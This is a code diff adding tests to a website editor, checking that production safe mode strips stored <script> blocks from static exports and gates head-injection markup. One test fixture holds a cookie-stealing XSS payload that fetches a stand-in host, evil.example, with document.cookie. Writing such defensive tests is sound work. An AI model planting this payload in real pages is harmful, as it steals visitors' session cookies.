@@ -77,3 +77,32 @@ test("the production CSP drops the broad https: script source and narrows frame-
   assert.match(prodScript, /'self'/, "script-src must keep 'self'");
   assert.match(config, /frame-ancestors 'self'\$\{DEV_LOOPBACK_FRAME_SOURCES\}`/, "frame-ancestors must be 'self' only (plus dev loopback)");
 });
+
+// ─── Item 8: behavioural — stored code does not reach a rendered/exported sink ──
+
+test("production safe mode strips a stored <script> from the STATIC EXPORT (behavioural)", async () => {
+  const { renderBlockToHtml } = await import("../src/built-ins/modules/website-editor/src/server/staticExport");
+  const evilBlock = { id: "b1", type: "html", props: { html: "<script>fetch('//evil.example?c='+document.cookie)</script>" } } as never;
+  const prior = process.env.NODE_ENV;
+  process.env.NODE_ENV = "production";
+  try {
+    const out = renderBlockToHtml(evilBlock);
+    assert.doesNotMatch(out, /<script>/i, "a stored <script> must not survive into a production export");
+    assert.match(out, /held for security review/i, "the export must emit a placeholder instead");
+  } finally {
+    if (prior === undefined) delete process.env.NODE_ENV; else process.env.NODE_ENV = prior;
+  }
+  // Non-production keeps the raw HTML so the feature can be built/tested.
+  const priorDev = process.env.NODE_ENV;
+  process.env.NODE_ENV = "development";
+  try {
+    assert.match(renderBlockToHtml(evilBlock), /<script>/i, "non-production renders the raw markup");
+  } finally {
+    if (priorDev === undefined) delete process.env.NODE_ENV; else process.env.NODE_ENV = priorDev;
+  }
+});
+
+test("SiteHead gates the stored head-injection script on production safe mode (source contract)", () => {
+  const src = readFileSync(join(ROOT, "src/built-ins/modules/website-editor/src/components/storefront/SiteHead.tsx"), "utf8");
+  assert.match(src, /mayRenderStoredMarkup\(\)\s*&&\s*publishedPage\.headInjection/, "headInjection must be gated by safe mode");
+});
